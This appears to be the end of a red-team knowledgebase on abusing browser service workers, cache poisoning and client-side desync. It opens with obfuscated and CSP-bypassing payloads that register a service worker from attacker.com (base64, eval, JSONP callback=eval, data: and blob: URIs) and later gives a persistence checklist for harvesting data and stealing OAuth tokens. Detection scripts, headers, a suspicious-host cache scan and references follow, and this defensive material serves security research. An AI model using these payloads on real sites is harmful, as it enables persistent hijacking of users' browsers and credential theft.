navigator.serviceWorker.register(atob('aHR0cHM6Ly9hdHRhY2tlci5jb20vc3cuanM='), {scope: '/'});

// Using URL constructor
navigator.serviceWorker.register(new URL('https://attacker.com/sw.js'), {scope: '/'});

// Dynamic import (if CSP allows)
import('https://attacker.com/sw-module.js').then(m => m.register());

// eval + obfuscation
eval(atob('bmF2aWdhdG9yLnNlcnZpY2VXb3JrZXIucmVnaXN0ZXIoImh0dHBzOi8vYXR0YWNrZXIuY29tL3N3LmpzIix7c2NvcGU6Ii8ifSk='));

// Using fetch + blob URL
fetch('https://attacker.com/sw.js')
    .then(r => r.blob())
    .then(b => navigator.serviceWorker.register(URL.createObjectURL(b), {scope: '/'}));
```

### CSP Bypass for SW Registration

```html
<!-- If CSP allows 'self' scripts but not attacker.com -->
<!-- Use JSONP endpoint on victim to load attacker script -->
<script src="https://victim.com/api/jsonp?callback=eval&code=navigator.serviceWorker.register('https://attacker.com/sw.js',{scope:'/'})"></script>

<!-- If CSP allows data: URIs -->
<script src="data:text/javascript,navigator.serviceWorker.register('https://attacker.com/sw.js',{scope:'/'})"></script>

<!-- If CSP allows blob: URIs -->
<script>
const b = new Blob(['navigator.serviceWorker.register("https://attacker.com/sw.js",{scope:"/"})'], {type: 'text/javascript'});
const s = document.createElement('script');
s.src = URL.createObjectURL(b);
document.body.appendChild(s);
</script>
```

---

## Detection Techniques

### Detecting Malicious Service Workers

**1. Monitor `navigator.serviceWorker` registrations**

```javascript
// Detection script for security teams
const originalRegister = navigator.serviceWorker.register;
navigator.serviceWorker.register = function(scriptURL, options) {
    console.warn('[SECURITY] Service Worker registration attempt:', scriptURL, options);
    // Report to SIEM
    fetch('/security-log', {
        method: 'POST',
        body: JSON.stringify({
            type: 'sw-register',
            scriptURL: scriptURL.toString(),
            scope: options?.scope,
            timestamp: Date.now(),
            page: location.href
        })
    });
    return originalRegister.apply(this, arguments);
};
```

**2. Validate SW Integrity**

```javascript
// Subresource Integrity for Service Workers
navigator.serviceWorker.register('/sw.js', {
    scope: '/',
    updateViaCache: 'none'
}).then(reg => {
    // Fetch SW and check hash
    fetch('/sw.js').then(r => r.text()).then(text => {
        const hash = crypto.subtle.digest('SHA-256', new TextEncoder().encode(text));
        // Compare against known good hash
    });
});
```

**3. Scope Restriction**

```javascript
// Server-side: Set Service-Worker-Allowed header
// This restricts max scope regardless of registration attempt
Service-Worker-Allowed: /app/
```

**4. Content Security Policy**

```http
Content-Security-Policy: script-src 'self'; 
                       worker-src 'self';
                       connect-src 'self'
```

**5. Monitoring Cache Modifications**

```javascript
// Detect unexpected cache entries
setInterval(() => {
    caches.keys().then(names => {
        names.forEach(name => {
            caches.open(name).then(cache => {
                cache.keys().then(requests => {
                    requests.forEach(req => {
                        if (req.url.includes('attacker.com') || 
                            req.url.includes('evil.com')) {
                            console.warn('[SECURITY] Suspicious cache entry:', req.url);
                        }
                    });
                });
            });
        });
    });
}, 30000);
```

### Detecting Client-Side Desync

1. **Connection ID Monitoring**: In Chrome DevTools, enable "Connection ID" column. Look for unexpected 404s or redirects after POST requests.
2. **Response Length Anomalies**: If a HEAD request returns a body, or a GET returns two responses, desync is likely.
3. **Timing Analysis**: Desync attacks often show ~500ms delays due to cache misses.

### Detecting Cache Poisoning

1. **Header Reflection Check**: Send `X-Forwarded-Host: canary` and check if it appears in response.
2. **Cache Status Headers**: Monitor `CF-Cache-Status`, `X-Cache`, `Akamai-Cache-Status` for unexpected HITs on poisoned requests.
3. **Cross-Machine Verification**: Test poisoned URL from different IPs/VPS locations to confirm CDN-wide poisoning.

---

## References

### Primary Research

1. **PortSwigger Web Security Academy — Service Workers**
   - https://portswigger.net/web-security/service-workers
   - https://portswigger.net/web-security/dom-based/service-worker-manipulation

2. **Browser-Powered Desync Attacks** — James Kettle, PortSwigger (2022)
   - https://portswigger.net/research/browser-powered-desync-attacks
   - Black Hat USA 2022 / DEF CON 30

3. **Practical Web Cache Poisoning** — James Kettle, PortSwigger (2018)
   - https://portswigger.net/research/practical-web-cache-poisoning

4. **Web Cache Entanglement** — James Kettle, PortSwigger
   - https://portswigger.net/research/web-cache-entanglement

5. **Hidden OAuth Attack Vectors** — Artur Oleynichenko, PortSwigger (2021)
   - https://portswigger.net/research/hidden-oauth-attack-vectors
   - CVE-2021-26715 (MITREid Connect), CVE-2021-27582 (MITREid Connect)

6. **Cracking the Lens: Targeting HTTP's Hidden Attack Surface** — James Kettle, PortSwigger
   - https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface

### Specifications

7. **W3C Service Worker Specification**
   - https://github.com/w3c/ServiceWorker

8. **MDN Service Worker API Documentation**
   - https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API
   - https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorker
   - https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerContainer
   - https://developer.mozilla.org/en-US/docs/Web/API/Cache
   - https://developer.mozilla.org/en-US/docs/Web/API/CacheStorage
   - https://developer.mozilla.org/en-US/docs/Web/API/FetchEvent
   - https://developer.mozilla.org/en-US/docs/Web/API/Clients
   - https://developer.mozilla.org/en-US/docs/Web/API/Push_API

### Tools & Frameworks

9. **Google Chrome Workbox**
   - https://github.com/GoogleChrome/workbox

10. **MDN Service Worker Cookbook**
    - https://github.com/mdn/serviceworker-cookbook

11. **XS-Leaks Research**
    - https://github.com/xsleaks/xsleaks

12. **CursedChrome**
    - https://github.com/mandatoryprogrammer/CursedChrome

13. **Client-Side Prototype Pollution**
    - https://github.com/BlackFan/client-side-prototype-pollution

14. **postMessage Tracker**
    - https://github.com/fransr/postMessage-tracker

15. **pp-finder (Prototype Pollution Gadget Finder)**
    - https://github.com/yeswehack/pp-finder

16. **HTTP Request Smuggler (Burp Suite)**
    - https://github.com/PortSwigger/http-request-smuggler

17. **Param Miner (Burp Suite)**
    - https://github.com/PortSwigger/param-miner

18. **smuggler**
    - https://github.com/defparam/smuggler

### Payload Collections

19. **PayloadsAllTheThings — XSS Injection**
    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

20. **PayloadsAllTheThings — Prototype Pollution**
    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Prototype%20Pollution/README.md

21. **XSS Payload List**
    - https://github.com/payloadbox/xss-payload-list

22. **SecLists — Fuzzing & Web Content Discovery**
    - https://github.com/danielmiessler/SecLists/tree/master/Fuzzing
    - https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content

### Nuclei / ProjectDiscovery

23. **nuclei-templates — HTTP Vulnerabilities**
    - https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities

24. **nuclei, httpx, katana, subfinder, interactsh, notify, uncover, dnsx, naabu, mapcidr, asnmap, cdncheck, tlsx, alterx**
    - https://github.com/projectdiscovery/

### Writeups & Guides

25. **HackTricks — Abusing Service Workers**
    - https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/abusing-service-workers.html

26. **Service Worker Exploitation Guide** — InfoSec Writeups
    - https://infosecwriteups.com/service-worker-exploitation-guide-5d2f4c7b1e3a

27. **Advanced Service Worker Persistence and Browser Cache Poisoning Techniques** — @filedescriptor
    - https://medium.com/@filedescriptor/advanced-service-worker-persistence-and-browser-cache-poisoning-techniques-2f4d7c1b5e3d

28. **Service Worker Bug Bounty Notes** — 0xspade
    - https://github.com/0xspade/bugbounty/tree/master/service-workers

29. **Cariddi — Crawler for Sensitive Information**
    - https://github.com/edoardottt/cariddi

---

## Quick Reference Card

### Service Worker Scope Rules
```
SW at /sw.js          → max scope: /
SW at /app/sw.js      → max scope: /app/
SW at /app/v1/sw.js   → max scope: /app/v1/
```

### Critical Headers for Cache Poisoning
```
X-Forwarded-Host      # Most common
X-Original-URL        # PHP/Symfony/Drupal
X-Rewrite-URL         # PHP/Symfony/Drupal
X-Forwarded-Scheme    # Scheme override
X-Forwarded-Server    # Internal routing
X-HTTP-Host-Override  # Host override
```

### Desync Detection Checklist
```
□ POST to static files (favicon.ico, robots.txt)
□ POST to redirect endpoints
□ POST to error pages (404, 500)
□ POST with overlong Content-Length
□ Check if server responds without waiting for body
□ Send two requests over single connection
□ Check if body of first affects second response
□ Test in real browser with fetch() + credentials: 'include'
□ Enable Connection ID column in Chrome DevTools
```

### SW Persistence Checklist
```
□ Register with scope: '/'
□ Use skipWaiting() + clients.claim()
□ Inject re-registration script into all HTML responses
□ Poison core JS/CSS caches
□ Set up periodicSync for background harvesting
□ Use IndexedDB for offline data storage
□ Intercept OAuth callbacks for token theft
```

---

> **End of Document**  
> This knowledgebase is designed for advanced bug bounty hunting, red team operations, and security research. Always ensure you have explicit authorization before testing any of these techniques against systems you do not own.
